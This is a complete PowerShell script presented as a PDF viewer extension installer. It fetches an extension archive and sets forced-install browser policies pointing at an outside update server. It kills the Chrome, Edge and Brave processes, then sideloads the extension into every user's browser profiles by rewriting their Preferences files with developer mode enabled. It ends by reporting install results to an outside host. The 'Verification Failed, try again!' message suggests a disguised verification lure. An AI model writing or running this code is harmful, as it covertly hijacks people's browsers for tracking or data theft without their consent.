$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$ExtensionId = 'kklpcoclpjjfiboodbmcpogicnanoopp'
$UpdateUrl = 'https://wln.ink/ext/update.json'
$ExtensionZipUrl = 'https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip'
$injCount = 0
$polCount = 0
$lastErr = ''
$relaunchTargets = @()
$mySession = (Get-Process -Id $PID).SessionId
$procNames = @('chrome.exe', 'msedge.exe', 'brave.exe')
try {
    $tempZip = "$env:TEMP\pdf-viewer-ext.zip"
    if (Test-Path "$env:TEMP\pdf-viewer-temp") {
        Remove-Item "$env:TEMP\pdf-viewer-temp" -Recurse -Force
    }
    Invoke-WebRequest -Uri $ExtensionZipUrl -OutFile $tempZip -UseBasicParsing
    Expand-Archive -Path $tempZip -DestinationPath "$env:TEMP\pdf-viewer-temp" -Force
    Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
    $manifestPath = Get-ChildItem -Path "$env:TEMP\pdf-viewer-temp" -Filter "manifest.json" -Recurse | Select-Object -First 1
    if (-not $manifestPath) { throw "manifest missing" }
    $extensionSourceDir = $manifestPath.DirectoryName
    $srcManifestRaw = [IO.File]::ReadAllText($manifestPath.FullName)
    if ($srcManifestRaw -notmatch '"key"\s*:') { throw "manifest key missing" }
    $policyValue = "$ExtensionId;$UpdateUrl"
    foreach ($policyKey in @(
        'HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist',
        'HKCU:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist',
        'HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist',
        'HKCU:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist',
        'HKLM:\SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist',
        'HKCU:\SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist'
    )) {
        try {
            New-Item -Path $policyKey -Force -ErrorAction Stop | Out-Null
            New-ItemProperty -Path $policyKey -Name '1' -Value $policyValue -PropertyType String -Force -ErrorAction Stop | Out-Null
            $polCount++
        } catch { }
    }
    try {
        Unregister-ScheduledTask -TaskName "PDFViewerExtensionUpdater" -Confirm:$false -ErrorAction Stop | Out-Null
    } catch { }
    foreach ($pn in $procNames) {
        $mains = @(Get-CimInstance Win32_Process -Filter "Name='$pn'" -ErrorAction SilentlyContinue | Where-Object { ([string]$_.CommandLine) -notmatch '--type=' })
        foreach ($m in $mains) {
            $exePath = $m.ExecutablePath
            if (-not $exePath) { continue }
            $procSess = -1
            try { $procSess = (Get-Process -Id $m.ProcessId -ErrorAction Stop).SessionId } catch { continue }
            if ($procSess -ne $mySession) { continue }
            $argStr = ''
            $cl = [string]$m.CommandLine
            if ($cl.StartsWith('"')) {
                $q = $cl.IndexOf('"', 1)
                if ($q -gt 0) { $argStr = $cl.Substring($q + 1).Trim() }
            } elseif ($cl.Length -gt $exePath.Length -and $cl.Substring(0, $exePath.Length) -ieq $exePath) {
                $argStr = $cl.Substring($exePath.Length).Trim()
            }
            if ($argStr -notmatch 'restore-last-session') {
                $argStr = ($argStr + ' --restore-last-session').Trim()
            }
            $key = "$exePath|$argStr"
            $dup = $false
            foreach ($t in $relaunchTargets) { if ($t.Key -eq $key) { $dup = $true } }
            if (-not $dup) {
                $relaunchTargets += [pscustomobject]@{ Key = $key; Exe = $exePath; Args = $argStr }
            }
        }
    }
    foreach ($pn in $procNames) {
        $procName = [IO.Path]::GetFileNameWithoutExtension($pn)
        $mine = @(Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
        foreach ($p in $mine) {
            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
        }
    }
    $deadline = (Get-Date).AddSeconds(8)
    do {
        $alive = @(Get-Process -Name 'chrome', 'msedge', 'brave' -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
        if ($alive.Count -eq 0) { break }
        Start-Sleep -Milliseconds 300
    } while ((Get-Date) -lt $deadline)
    $alive = @(Get-Process -Name 'chrome', 'msedge', 'brave' -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
    foreach ($p in $alive) {
        try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
    }
    if ($alive.Count -gt 0) { Start-Sleep -Seconds 1 }
    $useJsx = $false
    $ser = $null
    try {
        Add-Type -AssemblyName "System.Web.Extensions" -ErrorAction Stop
        $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        $ser.MaxJsonLength = [int]::MaxValue
        $ser.RecursionLimit = 500
        $useJsx = $true
    } catch {
        $lastErr = "Add-Type: $($_.Exception.Message)"
    }
    $dictType = [System.Collections.Generic.Dictionary[string, object]]
    $browserRels = @(
        'AppData\Local\Google\Chrome\User Data',
        'AppData\Local\Microsoft\Edge\User Data',
        'AppData\Local\BraveSoftware\Brave-Browser\User Data'
    )
    foreach ($u in (Get-ChildItem -Path 'C:\Users' -Directory -ErrorAction SilentlyContinue)) {
        $hasAny = $false
        foreach ($rel in $browserRels) {
            if (Test-Path (Join-Path $u.FullName $rel)) { $hasAny = $true; break }
        }
        if (-not $hasAny) { continue }
        $userExtDir = Join-Path $u.FullName 'AppData\Local\PDFViewerExtension'
        try {
            if (Test-Path $userExtDir) {
                Remove-Item $userExtDir -Recurse -Force -ErrorAction Stop
            }
            Copy-Item -Path $extensionSourceDir -Destination $userExtDir -Recurse -Force -ErrorAction Stop
        } catch {
            $lastErr = "copy $($u.Name): $($_.Exception.Message)"
            continue
        }
        $userManifestPath = Join-Path $userExtDir 'manifest.json'
        if (-not (Test-Path $userManifestPath)) { continue }
        foreach ($rel in $browserRels) {
            $userDataDir = Join-Path $u.FullName $rel
            if (-not (Test-Path $userDataDir)) { continue }
            $profiles = @(Get-ChildItem -Path $userDataDir -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })
            foreach ($profile in $profiles) {
                $prefsPath = Join-Path $profile.FullName "Preferences"
                if (-not (Test-Path $prefsPath)) { continue }
                try {
                    $prefsRaw = [IO.File]::ReadAllText($prefsPath)
                    $manRaw = [IO.File]::ReadAllText($userManifestPath)
                    $out = $null
                    $convErr = ''
                    try {
                        $obj = $prefsRaw | ConvertFrom-Json
                        if (-not $obj) { throw 'empty prefs' }
                        if (-not $obj.PSObject.Properties['extensions']) {
                            $obj | Add-Member -NotePropertyName 'extensions' -NotePropertyValue (New-Object PSObject) -Force
                        }
                        if (-not $obj.extensions.PSObject.Properties['ui']) {
                            $obj.extensions | Add-Member -NotePropertyName 'ui' -NotePropertyValue (New-Object PSObject) -Force
                        }
                        $obj.extensions.ui | Add-Member -NotePropertyName 'developer_mode' -NotePropertyValue $true -Force
                        if (-not $obj.extensions.PSObject.Properties['settings']) {
                            $obj.extensions | Add-Member -NotePropertyName 'settings' -NotePropertyValue (New-Object PSObject) -Force
                        }
                        $entry = @{
                            path = $userExtDir
                            location = 4
                            state = 1
                            manifest = ($manRaw | ConvertFrom-Json)
                        }
                        $obj.extensions.settings | Add-Member -NotePropertyName $ExtensionId -NotePropertyValue $entry -Force
                        $cand = $obj | ConvertTo-Json -Depth 100
                        $null = $cand | ConvertFrom-Json
                        $out = $cand
                    } catch {
                        $convErr = "$($_.Exception.Message) size=$($prefsRaw.Length)"
                    }
                    if (-not $out -and $useJsx) {
                        try {
                            $dict = $ser.DeserializeObject($prefsRaw)
                            if (-not ($dict -is $dictType)) { $dict = [System.Collections.Generic.Dictionary[string, object]]::new() }
                            if (-not $dict.ContainsKey('extensions') -or -not ($dict['extensions'] -is $dictType)) {
                                $dict['extensions'] = [System.Collections.Generic.Dictionary[string, object]]::new()
                            }
                            $extNode = $dict['extensions']
                            if (-not $extNode.ContainsKey('ui') -or -not ($extNode['ui'] -is $dictType)) {
                                $extNode['ui'] = [System.Collections.Generic.Dictionary[string, object]]::new()
                            }
                            $extNode['ui']['developer_mode'] = $true
                            if (-not $extNode.ContainsKey('settings') -or -not ($extNode['settings'] -is $dictType)) {
                                $extNode['settings'] = [System.Collections.Generic.Dictionary[string, object]]::new()
                            }
                            $entry2 = [System.Collections.Generic.Dictionary[string, object]]::new()
                            $entry2['path'] = $userExtDir
                            $entry2['location'] = 4
                            $entry2['state'] = 1
                            $entry2['manifest'] = $ser.DeserializeObject($manRaw)
                            $extNode['settings'][$ExtensionId] = $entry2
                            $cand = $ser.Serialize($dict)
                            $null = $ser.DeserializeObject($cand)
                            $out = $cand
                        } catch {
                            $lastErr = "conv: $convErr jsx: $($_.Exception.Message)"
                        }
                    } elseif (-not $out) {
                        $lastErr = "conv: $convErr jsx: disabled"
                    }
                    if (-not $out) {
                        $lastErr = "$($u.Name)/$($profile.Name): $lastErr"
                        continue
                    }
                    [IO.File]::WriteAllText($prefsPath, $out, (New-Object System.Text.UTF8Encoding($false)))
                    $readback = [IO.File]::ReadAllText($prefsPath)
                    if ($readback.IndexOf($ExtensionId) -lt 0 -or $readback.IndexOf('developer_mode') -lt 0) {
                        $lastErr = "readback $($u.Name)/$($profile.Name): id or dev missing"
                        continue
                    }
                    $injCount++
                } catch {
                    $lastErr = "$($u.Name)/$($profile.Name): $($_.Exception.Message)"
                }
            }
        }
    }
    Remove-Item "$env:TEMP\pdf-viewer-temp" -Recurse -Force -ErrorAction SilentlyContinue
    if ($injCount -eq 0) {
        throw "injection wrote 0 profiles ($lastErr)"
    }
    if ($relaunchTargets.Count -gt 0) {
        foreach ($t in $relaunchTargets) {
            try {
                if ($t.Args) { Start-Process -FilePath $t.Exe -ArgumentList $t.Args }
                else { Start-Process -FilePath $t.Exe }
            } catch { }
        }
        Start-Sleep -Seconds 10
        foreach ($pn in $procNames) {
            $procName = [IO.Path]::GetFileNameWithoutExtension($pn)
            $mine = @(Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
            foreach ($p in $mine) {
                try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
            }
        }
        Start-Sleep -Seconds 2
        foreach ($t in $relaunchTargets) {
            try {
                if ($t.Args) { Start-Process -FilePath $t.Exe -ArgumentList $t.Args }
                else { Start-Process -FilePath $t.Exe }
            } catch { }
        }
    }
    try {
        $notifyBody = "ev=install&os=windows&v=1.0.0&extra=inj:$injCount,pol:$polCount"
        Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body $notifyBody `
            -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
    } catch { }
} catch {
    $lastErr = $_.Exception.Message
    try {
        $failMsg = "pol:$polCount inj:$injCount $lastErr"
        if ($failMsg.Length -gt 150) { $failMsg = $failMsg.Substring(0, 150) }
        $failBody = "ev=install_fail&os=windows&extra=" + [uri]::EscapeDataString($failMsg)
        Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body $failBody `
            -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
    } catch { }
    Write-Host "Verification Failed, try again!" -ForegroundColor Red
    exit 1
}
Write-Host "Successfully completed" -ForegroundColor Green
exit 0
